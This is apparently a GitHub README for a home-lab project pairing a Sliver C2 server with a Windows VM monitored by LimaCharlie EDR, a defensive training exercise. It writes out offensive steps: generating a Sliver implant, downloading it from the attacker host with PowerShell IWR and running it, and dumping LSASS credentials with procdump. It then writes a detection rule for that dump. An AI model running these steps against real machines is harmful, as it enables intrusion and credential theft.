<h1>Endpoint Detection and Response</h1>

 
 <h2>Description</h2>
In this Project, attacks are simulated using a virtual Windows and Linux machine and the attack is monitored, detected and blocked using the Endpoint Detection and Response agent
called LimaCharlie.Through LimaCharlie, simulated attacks are detected and blocked using detection/block rules.<br />


<h2>Languages and Utilities Used</h2>

- <b>PowerShell</b> 
- <b>Command Line</b>
- <b>Sliver</b>
- <b>Sysmon</b>
- <b>LimaCharlie</b>
- <b>Secure Shell(SSH)</b>

<h2>Environments Used </h2>

- <b>VMware Workstation Pro 17</b>
- <b>Windows 11 Enterprise</b>
- <b>Linux Ubuntu(Server Version)</b> 


<h2>Project walk-through:</h2>

The setup for the VM environment consists of many steps.  For the detailed steps, a link is provided to Eric Capuano's blog <b>So you want to be a SOC Analyst?(Part1)</b> <a href=https://blog.ecapuano.com/p/so-you-want-to-be-a-soc-analyst-part>here</a>

The Summary of the VM Environment is as follows:
A.  Establishment of a Windows Virtual Machine with Windows Defender disabled/suppressed and
    and Sysmon installed. Sysmon will provide telemetry through LimaCharlie which is also installed
    on the Windows VM.

B.  Linux Virtual Machine (Ubuntu Server Version) with Sliver Command and Control framework installed.
    Sliver will be used to deliver malware to the Windows VM.

<p align="left"><b>Attack & Monitor</b><br/>

1.  In Linux Machine:
    Drop into root shell and change directory to Sliver location--> cd /opt/sliver

2.  Launch Sliver C2 Agent-->sliver-server

     ![image](https://github.com/4cysec/Endpoint-Detection-and-Response/assets/149924544/df71e29b-f3c4-4ca1-a42d-ce608735378f)

3.  Generate C2 session payload with Sliver using Linux Machine’s IP address obtained during the establishment of the Virtual Machines mentioned above.

     --> generate --http  Linux IP Address --save /opt/sliver

    ![image](https://github.com/4cysec/Endpoint-Detection-and-Response/assets/149924544/5bdaed61-3a37-45bc-b754-ec40db806e76)

    Note that MASSIVE_DEPRESSIVE.EXE is the payload/implant name in my case.

4.  Within the opt/sliver directory, we use the following python script to execute a temporary server
    --> python3 -m http.server 80

5. Switch over to Windows Virtual Machine while server is established in Linux Machine
   and launch an Administrative PowerShell console

6. Within the Administrative Powershell Console we run the following command to simulate
   the downloading of the C2 payload from the Linux Attacker Machine.
   
   --> IWR -Uri http://Linux IP/payloadname.exe -Outfile C:\Users\User\Downloads\payloadname.exe

7.  Now that the payload has been downloaded on the Windows Machine, we can execute the Command
    and Control Session as an attacker through the Linux Machine.
    
   a.  Using the SSH session on the Linux server We will relaunch Sliver with command --> sliver-server
   
   b.  Then we start the listener with -->http

![image](https://github.com/4cysec/Endpoint-Detection-and-Response/assets/149924544/a84825cd-e9e8-4a03-9b60-08006dc91fff)

8.  Switching over to the Windows Machine, we then execute the payload with the following command using Admin Powershell Prompt:
    --> C:\Users\User\Downloads\<your_C2-implant>.exe
    Note that the established session is shown on the Linux Machine as shown below.

![image](https://github.com/4cysec/Endpoint-Detection-and-Response/assets/149924544/6c9c5a86-cfa2-431a-849a-1277643ca12a)

Various attacks can be done through the established session. However, we will proceed to monitoring and detecting this attack in
the Lima Charlie tool.

9.  We can now look for our attack in the Lima Charlie web application. Please note that Lima Charlie was configured after
    the establishment of the virtual machines. The detailed steps are in the link above.

    --> Sensor List
        --> Hostname(windev2305eval.localdomain)

![image](https://github.com/4cysec/Endpoint-Detection-and-Response/assets/149924544/a7849e22-66e5-4caa-a8e5-988e51a4e759)

    From here we navigate to -->processes and we find our malware "MASSIVE_DEPRESSIVE.exe"
    Note that there is no green check indicating a signature for the malware. A lack of signature can indicate a malicious
    file/process.

    ![image](https://github.com/4cysec/Endpoint-Detection-and-Response/assets/149924544/985161fa-1ac7-46d6-8db9-a11361fb13d6)

  Navigating just below Processes to --> Network we can see the malware and its source IP and other information.

  ![image](https://github.com/4cysec/Endpoint-Detection-and-Response/assets/149924544/fd77e80b-4e11-4adf-a06a-296534ed5bfc)

  Below the Network we may go into -->File System and search for the malware's file path.

![image](https://github.com/4cysec/Endpoint-Detection-and-Response/assets/149924544/9631c089-114f-4ba9-9d1a-71fe5bd3a79a)

In the same left menu, we can click on Timeline and monitor near real-time telemetry of the host system.  We can find the
event and its processes and the time of its processes.

![image](https://github.com/4cysec/Endpoint-Detection-and-Response/assets/149924544/dfffca45-e5a7-44be-ae0a-436923b90d1d)




<p align="left"><b>Attack & Detection with Rules</b><br/>

Now we will attack the Windows VM and detect the attack with a detection rule.

1.  First we reestablish the Sliver malware's attack session with the Windows VM
    and look for the privileges we have on the Windows machine through the C2 agent.
    ---> use[session id]
         -->getprivs
      And we check for "SeDebugPrivilege" which allows for privilege escalation in attacks.

    ![image](https://github.com/4cysec/Endpoint-Detection-and-Response/assets/149924544/e34dfa4d-7b5b-4512-95b8-6826f36f8f8a)

2.  We will use an attack that threat actors use for stealing credentials from a system.
 Using the command -->procdump -n lsass.exe -s lsass.dmp
We can find the attack in the Timeline section in Lima Charlie by filtering Sensitive Process Access

![image](https://github.com/4cysec/Endpoint-Detection-and-Response/assets/149924544/6a40730c-c45f-4ec5-9274-48ca26c92740)

3. Now we will write a detection rule through Lima Charlie.
   Clicking on the event opens an event panel with information.
   To enter a detection rule, we click on the box shown below
   ![image](https://github.com/4cysec/Endpoint-Detection-and-Response/assets/149924544/5a58c133-5493-4b7e-84c5-a5bb4d81763e)

   In the "Detect" box we remove the previous detection contents from the box and entering our rule
   --> event: SENSITIVE_PROCESS_ACCESS
       op: ends with
       path: event/*/TARGET/FILE_PATH
       value: lsass.exe

       The above specifies detecting an event of SENSITIVE PROCESS ACCESS with the process having lsass.exe.


        In the "Respond" box we add --> - action: report
                                         name: LSASS access
   
 This will prompt Lima Charlie to provide a detection report upon detection. Click Save and name the rule.

![image](https://github.com/4cysec/Endpoint-Detection-and-Response/assets/149924544/6262f2c7-3cfa-47d2-9448-1c1ca642c8b5)



          
    


    
<!--
 ```diff
- text in red
+ text in green
! text in orange
# text in gray
@@ text in purple (and bold)@@
```
--!>
